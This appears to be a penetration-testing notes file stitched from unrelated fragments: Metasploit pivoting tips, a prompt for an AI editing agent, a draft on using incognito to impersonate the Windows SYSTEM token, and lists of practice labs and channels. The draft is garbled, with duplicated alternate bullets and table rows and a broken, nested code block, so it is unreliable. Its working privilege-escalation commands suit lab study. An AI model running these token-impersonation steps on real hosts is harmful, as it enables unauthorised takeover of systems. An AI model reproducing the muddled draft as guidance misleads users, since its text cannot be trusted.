| proxychains times out. | SOCKS proxy version mismatch. | Ensure `VERSION` in the module matches the proxychains config (`socks5` vs. `socks4`). |

>[!tip]+
> - Migrate to a stable system process (`spoolsv.exe`, `svchost.exe`) immediately after landing a session.
> - Use `autoadd` mode in autoroute to avoid missing subnets.
> - Run the SOCKS proxy as a background job (`run -j`) to keep the `msfconsole` free.
> - Test connectivity with a quick `curl` or the `ping_sweep` module before running heavy scans.
> - Prefer `bind_tcp` for second-hop exploitation through routes.
> - Use stageless payloads for multi-hop pivots.
`

```
You are the Implementer. Follow `content/Uncategorized/AI style & formatting guide.md` for all style/formatting/terminology rules, and `AGENTS.md` for repository boundaries and the editorial review workflow.

Open **`<INSERT GUIDE PATH HERE>`** and find the first unchecked step (`- [ ]`) under its Roadmap & Execution Checklist. Execute only that step's instructions — nothing beyond it, and no later steps. Preserve all existing valid technical content; only remove material that's factually wrong or off-topic. Don't touch existing frontmatter. Follow the diff-first review workflow: show the changes before they're considered accepted.

When the step is done, change only that step's `- [ ]` to `- [x]` in the guide file. Do not edit anything else in the guide, and do not set or change `status` in any content note — that's mine to do manually.

If the step requires a judgment call I haven't made, stop and report it instead of guessing.
```


# drafts

### Enumerating and impersonating tokens with incognito


- Incognito is available as a standalone binary (`incognito.exe`) or as a [Metasploit module](https://www.rapid7.com/docs/metasploit/latest/reference/modules/incognito/) (`incognito`).
- Transfer `incognito.exe` to the target host and list available token contexts:


- Incognito is available as a standalone executable (`incognito.exe`) and as a Metasploit post-exploitation extension (`incognito`).
- List unique user tokens across running processes using the standalone binary:

```powershell
.\incognito.exe list_tokens -u
```

- Impersonate a `SYSTEM` token to launch a new command shell:
- Impersonate the `NT AUTHORITY\SYSTEM` token to launch an elevated command prompt:

```powershell
.\incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
```

| Option | Argument | Description |
| :--- | :--- | :--- |
| `list_tokens` | `-u` | Lists available unique user tokens found across running processes. |
| `execute` | `-c` | Specifies the target token identity to impersonate. |
| `execute` | `cmd.exe` | Executable to launch under the impersonated token. |
| `list_tokens` | `-u` | Lists unique user access tokens discovered across active processes. |
| `execute` | `-c` | Designates the target user identity to impersonate. |
| `execute` | `cmd.exe` | Target executable launched under the impersonated security context. |

- When operating inside a Meterpreter session, load the Incognito extension and list available user tokens:
- When operating inside a Meterpreter session, load the extension and impersonate available tokens:

```bash
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

- Impersonate the target token directly within Meterpreter:
- Verify that your active shell context switched to `SYSTEM`:

```bash
impersonate_token "NT AUTHORITY\\SYSTEM"
```powershell
whoami
```




|                                                                                               |                                                                                                                                                                                                                                |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)                                 | Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws. |
| [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) | Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.                                                                                                     |
| [Metasploitable 3](https://github.com/rapid7/metasploitable3)                                 | Is a template for building a vulnerable Windows VM configured with a wide range of [vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities).                                                          |
| [DVWA](https://github.com/digininja/DVWA)                                                     | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                                                                      |

YouTube channels

|                                                                          |                                                                                                                                                              |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)       | Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques. |
| [VbScrub](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ)      | Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.                                                    |
| [STÖK](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg)         | Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.                                  |
| [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w) | Provides videos on a wide variety of technical infosec topics.                                                                                               |

Blogs

https://0xdf.gitlab.io/

| [Lame](https://app.hackthebox.com/machines/1) | [Blue](https://app.hackthebox.com/machines/51) | [Nibbles](https://app.hackthebox.com/machines/121) | [Shocker](https://app.hackthebox.com/machines/108) | [Jerry](https://app.hackthebox.com/machines/144) |
| --------------------------------------------- | ---------------------------------------------- | -------------------------------------------------- | -------------------------------------------------- | ------------------------------------------------ |

| [Find The Easy Pass](https://app.hackthebox.com/challenges/5) | [Weak RSA](https://app.hackthebox.com/challenges/6) | [You know 0xDiablos](https://app.hackthebox.com/challenges/106) |
| ------------------------------------------------------------- | --------------------------------------------------- | --------------------------------------------------------------- |

The [Dante Pro Lab](https://app.hackthebox.com/prolabs/overview/dante) is the most beginner-friendly lab offered to date.